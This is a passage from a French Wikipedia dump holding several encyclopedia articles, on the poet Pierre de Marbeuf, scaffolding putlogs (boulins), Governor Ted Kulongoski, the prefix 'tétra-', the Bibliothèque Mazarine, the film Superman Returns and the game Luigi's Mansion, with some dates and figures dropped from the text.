Il revient à Orléans, ville dans laquelle il fait la connaissance d’une jeune Parisienne qu'il appelle Hélène et « qui eut le pouvoir de lui faire négliger ses dernières études ». À Hélène succédèrent, dans un ordre connu de lui seul Jeanne puis Madeleine, Gabrielle, Philis et Amaranthe. Quoi qu'il en soit, Marbeuf retourna dans sa contrée d'origine.
De retour en Normandie en 1623, il acquiert la charge de maître des eaux et forêts qu'il exerce dans la vicomté du Pont-de-l'Arche, tout en continuant à écrire. Ainsi fait-il allusion à cette vie forestière en se donnant dans ses vers le nom de Sylvandre. À la nature et l'amour galant, sujets traditionnels du baroque, il donne un tour original et personnel. Son purisme et sa piété ne l'empêchent pas de s'illustrer dans les registres comique et pathétique, ainsi que dans la satire.
Le , Pierre de Marbeuf épouse Madeleine de Grouchet, fille de Charles de Grouchet, sieur du Mesnil et de Soquence, conseiller au Parlement de Rouen. Cette union ne sera pas heureuse - il surnomme sa femme Alecto et "Mégère -" mais des enfants en sont issus, parmi lesquels François de Marbeuf, qui deviendra avocat.
Son œuvre rare et exigeante est regroupée dans un "Recueil des vers" publié à Rouen en 1628.
En 1633, paraît le "Portrait de l'homme d'État dédié à .
On ne connaît pas la date exacte de sa mort, mais il est certain qu'il vivait encore au commencement du règne de Louis XIV (1643).
Analyse de l’œuvre.
Dans la section "Pour Philis. Le miracle de l'Amour", de son "Recueil de vers" de 1628, il compose sept sonnets. Le dernier, sonnet baroque le plus connu à ce jour de Marbeuf, associe avec virtuosité le thème de l'eau à celui de l'amour, notamment en utilisant les champs lexicaux respectifs de ces thèmes. &lt;poem&gt;
&lt;/poem&gt;
Article sur l'œuvre.
Henri Lafay, "Pierre de Marbeuf et la nouvelle poésie de 1620", dans "Les Ecrivains normands de l'âge classique et le goût de leur temps". Actes du colloque d'Angers du , publiés par les "Cahiers des Annales de Normandie" (n°14), Caen, 1982.
Voir aussi.
Liens externes.
 

</doc>
<doc id="248570" url="https://fr.wikipedia.org/wiki?curid=248570" title="Boulin (maçonnerie)">
Boulin (maçonnerie)

Un boulin est une pièce d'échafaudage en bois, horizontale, engagée dans la maçonnerie par une ouverture nommée « trou de boulin » (ou « ope »). Le boulin est une traverse qui porte les planchers de l'échafaudage, les platelages. Par extension, le terme de boulin s’applique à ces trous de boulin qui sont laissés apparents (pas rebouchés) après le retrait de l'échafaud.
Caractéristiques.
Dans l'échafaudage classique, le boulin est une pièce en bascule soulagée à son extrémité opposée par des pièces de bois obliques (les jambettes), ou verticales nommée « échasse » ou « perches ». Dans l’échafaudage mis en place à l’aide d’un système d’équerres (triangulation d’un boulin, d’un potelet, ménagé le long du mur et d’une jambette), le contreventement de ces équerres et assuré par le platelage même.
Les trous de boulin sont présents dans l'architecture depuis la plus haute Antiquité. Borgnes ou traversants, perpendiculaires, de biais ou coudés en baïonnette, ils marquent les points où l'échafaudage était fixé, donnant ainsi des indications sur les techniques utilisées. Dans le moyen et grand appareil dont les blocs ont une hauteur supérieure à la section du boulin, le tailleur de pierre pratique une échancrure carrée ou rectangulaire dans un angle ou la face du bloc. Dans le petit appareil, le maçon décale un bloc dans l'assise ou deux blocs dans deux assises superposées. .
En Belgique et dans le nord de la France au.
C'est un élément d'architecture très commun au dans l'architecture civile, notamment en Belgique et dans le nord de la France, où il a été largement exploité comme élément de décoration.
Le boulin est généralement sous le niveau de la corniche dans les immeubles du .
Le trou de boulin est souvent percé au niveau du plancher du grenier auquel le boulin lui-même peut être fixé par un étrier métallique.
Le trou de boulin est souvent refermé par une pièce d'ornement décorative, appelée « cache-boulin », avec par exemple un motif de tête de lion ou encore d'étoile. Cet ornement peut être fixé sur une pièce de bois courte qui s'enfonce dans la maçonnerie (vers 1830), ou être articulé sur un axe horizontal pour masquer le trou de boulin (vers 1870 et après).
Il était communément utilisé, avant l'avènement des plates-formes hydrauliques et des échelles motorisées, en frappant une poulie pour le déménagement des meubles aux étages des maisons.

</doc>
<doc id="248572" url="https://fr.wikipedia.org/wiki?curid=248572" title="Traumatisme physique">
Traumatisme physique



</doc>
<doc id="248575" url="https://fr.wikipedia.org/wiki?curid=248575" title="Ted Kulongoski">
Ted Kulongoski

Theodore R. Kulongoski, né en 1940, est un homme politique américain d'origine polonaise et gouverneur démocrate de l'État de l'Oregon entre 2003 et 2011.
Biographie.
Enfance et études.
Kulongoski est né le dans le Missouri. À la mort de son père, alors qu'il n'a que quatre ans, Ted Kulongoski est envoyé dans une pension catholique où il passe le reste de son enfance. 
Après le lycée, il s'engage dans le Corps des Marines des États-Unis pour se payer ses études de droit à l'université du Missouri. Juriste en droit du travail, Ted Kulongoski s'installe à Eugene, dans l'État côtier de l'Oregon.
Carrière politique.
En 1974, Ted Kulongoski est élu à la Chambre des représentants de l'Oregon et en 1978 au Sénat de l'État. En 1980, il tente de se faire élire au Sénat fédéral mais il est battu par le sénateur sortant républicain Bob Packwood. En 1982, il se présente au poste de gouverneur mais est battu par le sortant républicain Victor G. Atiyeh.
En 1987, le gouverneur démocrate Neil Goldschmidt le nomme au poste de commissaire aux assurances de l'État, où il réforme le système d'assurance et de compensation au bénéfice des salariés de l'Oregon, tout en abaissant les coûts pour les entreprises. En 1992, Kulongoski est élu au poste d"'Attorney General" de l'Oregon, où il réforme le système pénal des mineurs.
En 1996, Ted Kulongoski est élu à la Cour suprême de l'Oregon. En 2001, il démissionne pour se présenter au poste de gouverneur. Vainqueur des primaires démocrates, il se présente en tant que candidat démocrate consensuel et modéré, se distinguant ainsi du style du gouverneur démocrate sortant, John Kitzhaber. Il propose ainsi de procéder à une meilleure comptabilité au lieu d'augmenter les impôts pour résoudre la crise budgétaire et la récession. En novembre 2002, il est élu de justesse avec moins de d'avance contre le républicain Kevin Mannix, alors que le libertarien Tom Cox récolte sous son nom près de . Il entre en fonction le , héritant d'un déficit massif et d'un taux de chômage important. 
En 2005, Ted Kulongoski envisage de faire campagne pour une loi régionale autorisant les unions civiles homosexuelles, à l'instar du Vermont, après que les électeurs de l'Oregon, en novembre 2004, aient massivement rejeté par référendum toute légalisation du mariage homosexuel.
En décembre 2005, avec un taux d'approbation de 43 % (contre 48 % d'opinions négatives), il n'arrive qu'en trente-huitième position en termes de popularité parmi les cinquante gouverneurs du pays, ex æquo avec Christine Gregoire, la gouverneure de Washington). En novembre 2006, il fut réélu avec 51 % des suffrages contre 43 % au candidat républicain Ron Saxton.

</doc>
<doc id="248576" url="https://fr.wikipedia.org/wiki?curid=248576" title="Journal des Débats">
Journal des Débats



</doc>
<doc id="248578" url="https://fr.wikipedia.org/wiki?curid=248578" title="Tétra-">
Tétra-

Tétra- est un préfixe numérique tiré du préfixe grec τετρα- ("tetra-"), dérivé de ("tessares") signifiant quatre. 
Tetra- est la forme que prend en composition le nombre quatre ; sinon le dialecte attique a "tettares" (masculin et féminin) et "tettara" (au neutre) et le dialecte ionien hésite entre "tessares" ("tessara" au neutre) et "tesseres" ("tessera" au neutre). Tetra vient d'une racine reconstituée *kwetr (avec un r vocalique, distingué quand c'est possible par un signe diacritique sous le r) et le latin quatuor provient d'une même racine indo-européenne (en composition le latin a quadri d'où quadrilatère face à tétraèdre).
Dérivé.
Par ailleurs, le linguiste et helléniste français Pierre Chantraine n'explique pas vraiment, dans le mot "trapeza" (trapèze vient du diminutif "trapezion") la forme réduite tra : "trapeza" signifie « table » et se décompose et remonte à *"tra-ped-ya" ("tra"="tetra" ; "ped" ou "pod" signifie « pied », l'alternance de e avec o étant courante dans certaines langues indo-européennes anciennes ; le y note un i consonne). Le mot tétrapode est un doublet de trapèze d'une facture plus reconnaissable.

</doc>
<doc id="248580" url="https://fr.wikipedia.org/wiki?curid=248580" title="Bibliothèque Mazarine">
Bibliothèque Mazarine

La bibliothèque Mazarine, communément appelée la Mazarine, est la plus ancienne bibliothèque publique de France.
Située quai de Conti, dans le quartier de la Monnaie du de Paris, elle constitue une « bibliothèque de grand établissement scientifique et littéraire », placée sous la tutelle du ministère de l'Enseignement supérieur et rattachée administrativement à l'Institut de France. Ses fonds, complétés au fil du temps, sont à l'origine issus de la bibliothèque personnelle du cardinal Mazarin (1602-1661).
Histoire.
Les bibliothèques de Mazarin.
Le cardinal Mazarin, déjà possesseur d'une bibliothèque de plusieurs milliers d'ouvrages à Rome, charge, dès , Gabriel Naudé d'en constituer une seconde à Paris. L'acquisition, en , de la bibliothèque du chanoine Descordes constitue, en quelque sorte l'acte fondateur de cette bibliothèque. Au cours des années suivantes, Naudé continue d'enrichir la bibliothèque par des achats, tant en France que dans les pays voisins ; en 1644 il se rend ainsi en Flandres, en 1645-1646 en Italie, en 1646-1647 en Allemagne, en 1647 en Angleterre et en Hollande. Parallèlement, la bibliothèque s'augmente de quelques belles collections telles la collection de Brienne (deux mille pièces originales concernant les affaires étrangères), celle de Rollan ou celle de Jean Tileman Stella, et des nombreux ouvrages, donnés ou dédiés à Mazarin. La bibliothèque ainsi constituée compte vraisemblablement, vers , environ volumes, ce qui en fait la plus importante collection rassemblée jusqu'alors en Europe.
La Fronde marque un coup d'arrêt dans le développement de la bibliothèque. Dès , elle est menacée par la décision du Parlement de Paris de confisquer les biens de Mazarin ; finalement, si la vente des meubles et tableaux est autorisée, aucune décision définitive n'est prise en ce qui concerne la bibliothèque, dont la garde est confiée à Naudé. La paix de Saint-Germain () et le retour de Mazarin à Paris sauvent provisoirement la bibliothèque mais, en , le Parlement met à prix la tête de Mazarin pour livres et décide, pour se procurer cette somme, de procéder à la vente de tout ce que contient le palais Mazarin, à commencer par la bibliothèque. et celle-ci est dispersée du au . Naudé réussit malgré tout à sauver par divers moyens (soustraction avant la vente ou recours à des prête-nom) une petite part des ouvrages, dans l'idée de pouvoir un jour reconstituer la bibliothèque.
Dès son retour triomphal à Paris, en , Mazarin rappelle Naudé — devenu entretemps bibliothécaire de la reine Christine de Suède —, mais celui-ci meurt en route et c'est à son ancien collaborateur, François de la Poterie, que Mazarin confie le soin de reconstituer une bibliothèque. La Poterie s'acquitte au mieux de cette tâche en récupérant les ouvrages sauvés par Naudé, en rachetant la bibliothèque personnelle de celui-ci et en reprenant ses méthodes. En 1661, cette seconde bibliothèque de Mazarin avait pratiquement retrouvé l'importance de la première.
La bibliothèque du collège des Quatre-Nations.
Souhaitant imiter son prédécesseur Richelieu et éviter que sa bibliothèque ne soit une nouvelle fois dispersée après sa mort, Mazarin décide de la léguer au collège des Quatre-Nations, qu’il fonde par testament en 1661, destiné à l'éducation de soixante jeunes gens originaires des quatre provinces réunies au royaume sous son gouvernement (Alsace, Flandres, Roussillon et Pignerol). Des "Lettres patentes portant règlement pour le collège des Quatre-Nations", données par Louis XIV au mois de , et enregistrées au Parlement le de la même année, confirment ces dispositions en les précisant.
La bibliothèque, rouverte en 1689 dans l'aile orientale du bâtiment construit pour abriter le collège, accueille durant tout le collégiens (dont Louis-Sébastien Mercier, qui en fait une description critique dans son "Tableau de Paris"), visiteurs étrangers et public érudit, tout en continuant d'enrichir ses collections jusqu'à compter, à la fin du , plus de .
La bibliothèque Mazarine.
Durant la Révolution française, la bibliothèque Mazarine est maintenue en activité en raison de son caractère public (Mazarin a indiqué dans son testament qu'il fallait que la bibliothèque restât ouverte au public). Mais le collège fut supprimé. Elle bénéficie même largement des confiscations révolutionnaires, grâce à l'action de son bibliothécaire, Gaspard Michel, dit l'abbé Leblond, qui puise largement dans les dépôts littéraires constitués avec les bibliothèques confisquées (la Mazarine possède ainsi, entre autres, une partie des manuscrits et ouvrages du prince Xavier de Saxe).
De à , la bibliothèque a fait partie de la Réunion des bibliothèques nationales.
Statut.
La bibliothèque Mazarine, bibliothèque patrimoniale d'étude et de recherche dépendant du ministère de l'Enseignement supérieur et de la Recherche, est placée sous l'autorité administrative de l’Institut de France qui occupe, depuis 1805, les anciens bâtiments du collège des Quatre-Nations.
Elle est, depuis 1643, publique et ouverte à tous. La consultation des collections se fait sur place uniquement et celle des ouvrages rares et précieux est soumise à conditions.
Collections.
La bibliothèque compte aujourd'hui environ . Si son très riche fonds ancien — près de — est encyclopédique, son fonds moderne est lui spécialisé en histoire, notamment l'histoire religieuse, littéraire et culturelle du Moyen Âge ( - s) et des - s, l'histoire du livre et l'histoire locale et régionale de la France.
Si la collection de manuscrits de Mazarin est aujourd'hui — du fait d'un « échange », en 1668, avec la Bibliothèque royale — à la Bibliothèque nationale de France, la bibliothèque compte malgré tout plus de (dont environ médiévaux parmi lesquels de nombreux manuscrits enluminés), provenant essentiellement de saisies révolutionnaires ; , dont un exemplaire de la bible de Gutenberg — connu sous le nom de "bible Mazarine" —, et la plus importante collection au monde de mazarinades.
La bibliothèque a également reçu aux plusieurs fonds importants parmi lesquels les archives de Pierre-Antoine Lebrun, de Joseph Tastu ou d'Arsène Thiébaut de Berneaud ; la bibliothèque et les archives scientifiques d'Albert Demangeon et de son gendre Aimé Perpillou (géographie) ; la très riche bibliothèque du Marcel Chatillon (histoire des Antilles) ou une partie de celles du chevalier de Paravey (voyages), de Jean-Jacques Ampère (civilisations nordiques), de Prosper Faugère (Blaise Pascal et le jansénisme)
La Bibliothèque continue à acheter des livres, manuscrits et s'est spécialisée dans les disciplines historiques.
La Bibliothèque organise des visites guidées gratuites, destinées uniquement aux particuliers. Organisées en fin de journée sous la conduite d'un conservateur, elles durent environ 1 h 30 et sont consacrées à l'histoire de la bibliothèque et de ses collections, à son architecture et à son décor, à la présentation de ses ressources et de ses services.
Hommage.
En 1980, sur son album "Clerc Julien, Quand je joue," Julien Clerc rend hommage à la bibliothèque, à travers la chanson qui ouvre l'album "Bibliothèque Mazarine," composée par lui-même et écrite par Etienne Roda-Gil, plaçant le texte dans l'époque du début des années 1980 en parlant du Pont des Arts en travaux, mais en parlant de quelqu'un au volant de sa voiture, écoutant à la radio du disco en anglais chanté par Julien, comme pour critiquer le fait qu'à l'époque beaucoup de chanteurs français se mettaient à chanter en anglais sur de la musique disco délaissant la langue française.
Personnalités liées.
Bibliothécaire de Mazarin
Bibliothécaires du collège Mazarin
Administrateurs (puis directeurs) de la bibliothèque Mazarine
Parmi les conservateurs, bibliothécaires de la Mazarine, on note :

</doc>
<doc id="248581" url="https://fr.wikipedia.org/wiki?curid=248581" title="Superman Returns">
Superman Returns

' ou Le retour de ""' au Québec est un film de super-héros américano-australien réalisé par Bryan Singer, sorti en 2006. Il s'agit de la cinquième adaptation cinématographique du personnage de Superman depuis 1978 et une suite directe de "Superman 2" (ne prenant pas en compte ses suites "Superman 3" et "Superman 4").
Cinq ans ont passé depuis le départ de Superman à la recherche de survivants de Krypton. À son retour sur Terre, revenu à Metropolis, il découvre que Lois Lane est désormais mère de famille et que Lex Luthor, libéré de prison, a dérobé un cristal kryptonien et prépare un nouveau plan machiavélique pour détruire le monde.
Le film reçoit des critiques plutôt positives à sa sortie, plébiscitant notamment les effets visuels, la réalisation et l'intrigue malgré des aspects jugés négatifs comme la durée du film. Le film récolte plus de 390 millions de dollars dans le monde, soit l'un des meilleurs films au box-office en 2006. Cependant, ces résultats sont jugés décevants par Warner Bros. qui ne produira pas de suite.
Le film est dédié à Christopher Reeve, l’acteur de Superman dans la saga (1978-1987), qui est décédé en 2004.
Synopsis.
Superman a disparu depuis cinq ans, depuis qu'il s'est rendu à l'endroit où les astronomes pensaient avoir découvert les restes de Krypton. Son ennemi juré, Lex Luthor, a récemment été libéré de prison et a épousé une riche veuve pour obtenir sa fortune à sa mort. N'ayant pas réussi à trouver des Kryptoniens survivants, Superman retourne sur Terre et reprend son travail au Daily Planet à Metropolis en tant que Clark Kent. Là, il apprend que la femme qu'il aime, Lois Lane, est fiancée au neveu de Perry White, Richard, avec qui elle a un fils de 5 ans nommé Jason. Elle a remporté le prix Pulitzer pour son article "Pourquoi le monde n'a pas besoin de Superman". Luthor se rend à la forteresse de la solitude et vole des cristaux kryptoniens, qu'il utilise pour une expérience qui provoque une panne de courant sur la côte Est. La perte de puissance interfère avec le test en vol d'une navette spatiale à lancer dans l'espace à partir de son montage sur un avion de ligne occupé par Lois, qui couvre l'histoire. Clark passe à l'action en tant que Superman, lançant la navette dans le ciel et empêchant l'avion de s'écraser.
Le monde se réjouit du retour de Superman, bien qu'il ait du mal à faire face au fait que ceux dont il était autrefois proche se sont quittés de lui. Lorsque Superman est distrait par un véhicule hors de contrôle, un détournement impliquant l'homme de main de Luthor, Kitty Kowalski, Luthor vole la Kryptonite du Musée d'histoire naturelle de Metropolis. Perry charge Lois d'interviewer Superman, tandis que Clark enquête sur la panne d'électricité. Lois et Jason montent par inadvertance sur le yacht de Luthor et sont capturés après que Lois ait décidé de s'intéresser à l'histoire du black-out, qu'elle relie à l'expérience de Luthor. Il leur révèle son projet d'utiliser l'un des cristaux kryptoniens volés, qu'il a combiné avec la Kryptonite, pour cultiver une nouvelle masse terrestre dans l'océan Atlantique qui supplantera les États-Unis et tuera des milliards de personnes.
Voyant le jeune Jason apparemment avoir une réaction à la Kryptonite, Luthor demande à Lois qui est son père ; Lois affirme que le père est Richard. Le cristal commence à créer la masse terrestre de Luthor tandis que Lois tente de s'échapper. Elle est attaquée par l'un des hommes de main de Luthor, mais un piano claque sur l'homme de main hors écran, provenant de l'endroit où Jason est assis pendant que le navire se balance dans les vagues. Pendant ce temps, Superman tente de minimiser la destruction à Metropolis causée par la croissance de la nouvelle masse terrestre, et Richard pilote un avion de mer pour sauver Lois et Jason.
Face à Luthor, Superman est affaibli par la masse terrestre puisqu'elle est remplie de Kryptonite, ce qui permet à Luthor et à ses hommes de main de le brutaliser. Superman est poignardé avec un éclat de Kryptonite par Luthor, tombe dans l'océan et est laissé à se noyer, mais il est sauvé par Lois et Richard. Après que Lois ait retiré l'éclat de Kryptonite de son corps, Superman retrouve sa force et soulève la masse terrestre grâce au fait qu'une grande partie de la masse de l'île se trouve entre lui et la Kryptonite. Les hommes de main de Luthor sont tués, mais Luthor et Kitty s'échappent dans leur hélicoptère. Ne voulant pas laisser mourir des milliards de personnes, Kitty jette les cristaux que Lex a volés dans la forteresse de la solitude avant que leur hélicoptère ne soit à court de carburant, les laissant bloqués sur une île déserte.
Superman pousse la masse terrestre avec les cristaux dans l'espace. Affaibli par la Kryptonite, il retourne sur Terre. À l'hôpital, après avoir retiré un autre éclat de Kryptonite du corps de Superman, les médecins apprennent qu'ils ne peuvent pas pénétrer sa peau avec leurs outils chirurgicaux, et qu'il reste dans le coma. En rendant visite à Superman, Lois lui chuchote quelque chose à l'oreille et l'embrasse. Superman se réveille et rend visite au Jason endormi, à qui il récite le dernier discours de son défunt père biologique Jor-El. Alors que Lois commence à écrire un article intitulé "Pourquoi le monde a besoin de Superman", Superman la rassure qu'il est de retour pour rester et s'envole pour une orbite basse, où il regarde le monde.
Production.
Développement.
Après "Superman 4", sorti en 1987, de nombreux réalisateurs travaillent sur des projets d'adaptations cinématographiques "Superman" comme Tim Burton, McG ou encore J. J. Abrams dès le milieu des années 1990.
Beaucoup de ces projets iront au stade de la préproduction comme "Superman Reborn" (1997) ou "Superman Flyby" (2002) mais seront annulés pour diverses raisons, budgétaires et artistiques. Bryan Singer imagine, durant le tournage de "X-Men 2" (2003), le retour de Superman sur Terre après 5 ans d’absence. Il présente son idée à Lauren Shuler Donner, productrice des films "X-Men", et à son mari Richard Donner, réalisateur du premier "Superman" sorti en 1978. Le couple trouve l'idée intéressante.
En , Warner Bros. débute la préproduction de "Superman: Flyby", prévu pour sortir en . McG doit alors réaliser le film, écrit par J. J. Abrams, mais abandonne le projet en juin 2004. Singer est alors contacté pour « pitcher » le film, alors qu'il prévoyait des vacances avec ses scénaristes Michael Dougherty et Dan Harris après la sortie de "X-Men 2". Ces derniers écrivent alors le scénario du film "Superman", d'après l'idée de Bryan Singer. En , Singer signe un contrat pour réaliser "Superman Returns". Il renonce alors à d'autres projets, comme "" et un remake de "L'Âge de cristal".
La préproduction du film, cofinancé par Warner Bros. et Legendary Pictures, débute réellement en . En , Dougherty et Harris ont déjà écrit 6 versions du script. Certaines versions contenant des allusions aux attentats du 11 septembre 2001 sont finalement supprimées.
Attribution des rôles.
Après les rumeurs les plus folles concernant l'identité de l'acteur principal, Singer annonce finalement que Brandon Routh succédera à Christopher Reeve. Brandon Routh, qui avait déjà auditionné pour le rôle de Clark Kent dans la série télévisée "Smallville", est choisi parmi des milliers de candidats à travers les États-Unis, le Canada, l'Angleterre ou encore l'Australie. Pour obtenir la silhouette du héros, il dut se soumettre à un régime et des exercices de culturisme.
Kevin Spacey devait interpréter Lex Luthor des années auparavant. C’était sur le film abandonné "Superman Lives", qui devait être réalisé par Tim Burton et avec Nicolas Cage dans le rôle-titre. Initialement prévu de sortir en juillet 1998, le film est annulé en raison du retard de la production. C’est des années plus tard où Singer, qui avait déjà dirigé l’acteur dans "Usual Suspects", qu’il lui confie enfin le rôle.
Pour le rôle de Lois Lane, Spacey a recommandé Kate Bosworth à Singer pour le rôle, car elle avait joué avec Spacey dans "Beyond the Sea". Natalie Portman, Evangeline Lilly, Charisma Carpenter, Mia Kirshner, Mischa Barton, Claire Danes et Keri Russell auraient également passé des auditions pour le rôle.
Noel Neill , refait une apparition au début du film en léguant sa fortune à Lex Luthor. Elle était déjà apparue dans le premier film, dans le rôle d'Ella Lane. Jack Larson, qui tenait le rôle de Jimmy Olsen dans "Les Aventures de Superman", fait ici un caméo en tant que barman. Il était déjà apparu en invité vedette dans des séries de Superman : "Superboy" en tant que Lou Lamont dans l'épisode "Paranoia" (épisode 6 de la saison 4) et "" où il interprétait Jimmy Olsen âgé dans l'épisode "Jeunesse volée" (épisode 5 de la saison 4).
Marlon Brando apparaît à titre posthume en tant que Jor-El, le défunt père biologique de Superman. L'acteur, décédé en 2004, reprend son rôle du film de 1978 grâce à l'utilisation de séquences précédentes combinées à des images générées par ordinateur, ses images, filmées auparavant par Richard Donner pour "Superman II" avant son licenciement, ont été sauvées pour la réalisation de "". Cela a nécessité des négociations avec la succession de Brando pour obtenir l'autorisation d'utiliser ses images. Bryan Singer a expliqué : .
Tournage.
Le tournage a lieu principalement en Australie, notamment en Nouvelle-Galles du Sud. D'autres scènes sont par ailleurs tournées à New York. C’est le cinquième film le plus cher de l'histoire du cinéma qui a été réalisé en 2006, pour un budget dépassant les 220 millions de dollars.
Musique.
"Superman Returns" est la bande originale du film de Bryan Singer composée par John Ottman, sans oublier le fameux thème "Main Titles" de John Williams, composé pour la bande originale de "Superman" de Richard Donner en 1978.
Accueil.
Critiques.
Sur l’agrégateur de critiques Rotten Tomatoes, il obtient 74% d'avis favorables pour 266 critiques et une note moyenne de . Le consensus suivant résume les critiques compilées par le site : . Sur Metacritic, qui utilise une moyenne pondérée, le film obtient une note de pour 40 critiques.
Sur le site Allociné, qui recense 23 critiques de presse, le film obtient la note moyenne de 
Quentin Tarantino admis avoir adoré le film de Bryan Singer, où il lui remet le prix du Saturn Award de la meilleure réalisation. Tarantino a d’ailleurs déclaré : « Je suis un grand fan de "Superman Returns". Je travaille actuellement sur une critique de 20 pages de ce film, mais je n'ai pas encore terminé. »
Box-office.
Le film récolte plus de 391 millions de dollars dans le monde, dont près de 200 millions au Canada et aux États-Unis. Il est le meilleur film au box-office nord-américain de 2006. En France, il totalise 1,4 million d'entrées ( meilleur film au box-office français annuel). Ces résultars seront cependant jugés insuffisants par Warner Bros. qui annule la suite prévue. En août 2008, Jeff Robinov déclare : Le studio produira finalement le "reboot" "Man of Steel",sorti en 2013.
Distinctions.
Entre 2006 et 2012, le film "Superman Returns" a été sélectionné dans diverses catégories et a remporté récompenses.
Projet de suite annulé.
L'équipe de "Superman Returns" devait rempiler en 2009 pour une suite, toujours avec Bryan Singer aux commandes et Brandon Routh dans le rôle-titre. Mais Warner Bros. annule le projet car, bien que "Superman Returns" fut rentable, elle était déçu de ses recettes au box-office mondial. Warner décide donc de reprendre la saga à zéro avec une approche originale, mettant en scène Henry Cavill dans le rôle de Superman. "Man of Steel" sortira en juin 2013, sous la direction de Zack Snyder.

</doc>
<doc id="248583" url="https://fr.wikipedia.org/wiki?curid=248583" title="Luigi's Mansion (jeu vidéo)">
Luigi's Mansion (jeu vidéo)

 est un jeu vidéo d'action-aventure, développé par et édité par Nintendo sur GameCube. Il est sorti au lancement de la GameCube, soit au Japon le , en fin d'année en Amérique du Nord et en 2002 en Europe. Il est l'un des rares jeux de la série "Super Mario" où Luigi est le personnage principal à la place de Mario.
Le jeu retrace les aventures de Luigi dans un manoir qu'il a gagné lors d'un concours auquel il n'a jamais participé. Pour fêter l'événement, il invite son frère Mario à le rejoindre dans sa nouvelle demeure. Sur place, il apprend par le professeur Karl Tastroff que son frère a été enlevé par des fantômes. Luigi part alors secourir son frère en parcourant le manoir et en combattant les fantômes rencontrés à l'aide d'un aspirateur inventé par le professeur.
 a été assez bien accueilli par la presse spécialisée, bien que les critiques aient généralement pointé du doigt sa faible durée de vie. Le jeu s'est vendu à plus de d'exemplaires et constitue le cinquième jeu le plus vendu sur . Il a été l'un des premiers jeux à ressortir sous le label Choix des Joueurs sur cette console. Un remake sur Nintendo 3DS est sorti le aux États-Unis, le en Europe et le au Japon et reprend le même principe que sur GameCube avec quelques nouveautés.
Le jeu a fait l'objet de deux suites, ', sorti sur Nintendo 3DS en 2013, et ', sorti sur Nintendo Switch en 2019. Il devient disponible en 2025 à partir du service Nintendo Switch Online de la Nintendo Switch 2 aux abonnés du pack additionnel.
Univers.
Trame.
Le jeu débute lorsque Luigi arrive dans un grand manoir sombre perdu au milieu d'une forêt. Le manoir est hanté par plusieurs fantômes, dont les Boos, et étudié par un vieux et brillant professeur, le professeur Karl Tastroff, qui vit dans un laboratoire souterrain près du manoir. Cette demeure comporte un rez-de-chaussée avec son jardin, deux étages, un sous-sol et un toit. Le joueur commence l'aventure dans le hall à partir duquel il visite les autres pièces du manoir.
Histoire.
L'histoire de commence au moment où Luigi gagne un manoir à la suite d'un concours auquel il n'a pas participé. Excité par la nouvelle, il appelle son frère Mario pour lui proposer de se retrouver au manoir pour fêter cela. Une fois arrivé devant le manoir, qui est beaucoup plus sinistre que le montrait la photographie de la demeure, Mario semble être introuvable. Luigi entre dans la maison et se fait aussitôt attaquer par un fantôme. Il est sauvé par un vieil homme armé d'un aspirateur. Celui-ci est cependant incapable d'attraper le fantôme qui disparaît. Le vieil homme se présente à Luigi comme le « Professeur Karl Tastroff ». Les deux personnages ressortent du manoir car d'autres fantômes apparaissent.
Près du manoir, dans l'atelier du professeur, Karl Tastroff informe Luigi que sa « nouvelle » maison n'a jamais existé et qu'elle est apparue seulement quelques jours auparavant. Il lui dit aussi qu'il a vu un homme avec une casquette rouge entrer dans le manoir et ne l'a jamais revu depuis. En apprenant qu'il s'agissait du frère de Luigi, K. Tastroff lui montre comment capturer les fantômes et lui confie son aspirateur : l'. Après avoir capturé plusieurs fantômes et débloqué toutes les pièces, Luigi se retrouve face au Roi Boo, en quête de vengeance, dans le sous-sol de la maison et ce dernier le transporte sur le toit pour l'affronter. Le Roi Boo, contrôlant un gigantesque Bowser ressuscité, est finalement battu et aspiré par l'Ectoblast 3000. Luigi retourne voir K. Tastroff avec Mario (emprisonné dans un tableau) et réussit enfin à sauver son frère. Le manoir disparaît et Luigi construit un autre manoir grâce à l'argent qu'il a récupéré pendant l'aventure. Selon l'argent obtenu, le manoir est de plus en plus grand. Dans la galerie, les cadres des fantômes changent selon la manière de la capture.
Système de jeu.
Dans , le professeur K. Tastroff arme Luigi de deux inventions : l'Ectoblast 3000 et le Game Boy Horror. L'Ectoblast 3000 est un aspirateur très puissant qui capture les fantômes et permet de recueillir des trésors. Pour capturer les fantômes, Luigi doit d'abord les éclairer avec sa lampe de poche pour les étourdir et faire apparaître leurs cœurs. Luigi peut alors les aspirer dans l'Ectoblast 3000 une fois que les points de vie du fantôme sont à zéro. Les fantômes restent coincés à l'intérieur de l'aspirateur et certains peuvent être transformés en portrait grâce à une machine du professeur, le Portrificateur Ectoplasmique. Ces portraits sont ensuite affichés dans la galerie de K. Tastroff. Selon le niveau de capture, le portrait varie entre le bronze, l'argent, l'or et le platine. Dans le jeu, Luigi découvre trois médaillons qui lui permettent de propulser du feu, de l'eau ou de la glace. Ces éléments peuvent être nécessaires pour capturer certains fantômes.
Le Game Boy Horror est un appareil portable qui permet à Luigi de trouver des indices dans la maison, et une fonctionnalité qui indique la présence d'un Boo dans la pièce et sa proximité avec Luigi. Elle contient un plan du manoir et permet de communiquer avec le professeur K. Tastroff. Toutes les pièces contenant des fantômes sont sombres et dès que Luigi les attrape tous, les lumières s'allument et un coffre apparaît. Ces coffres peuvent contenir une clé, de l'argent ou des médaillons. Lorsque Luigi trouve une clé, le Game Boy Horror indique automatiquement la pièce qu'elle ouvre. Sa forme ressemble à celle d'une Game Boy Color d'où elle tient son nom, en effet, le terme « Horror » remplace le terme « Color ».
Tout au long du jeu, Luigi trouve des pièces, des billets, des lingots ou encore des pierres précieuses. Une fois que le Roi Boo, le boss final du jeu, est vaincu, le joueur reçoit une note sur le trésor amassé pendant le jeu. Sa note varie de S à H selon le trésor amassé : plus Luigi est riche, plus la note se rapproche de S, à l'inverse, plus il est pauvre, plus la note se rapproche de H. Lorsque le joueur finit l'aventure, une deuxième version du manoir nommée et contenant des ennemis plus coriaces devient jouable. Dans la version européenne, le plan de la demeure est également inversé horizontalement semblable à la Master Quest de "" .
Développement.
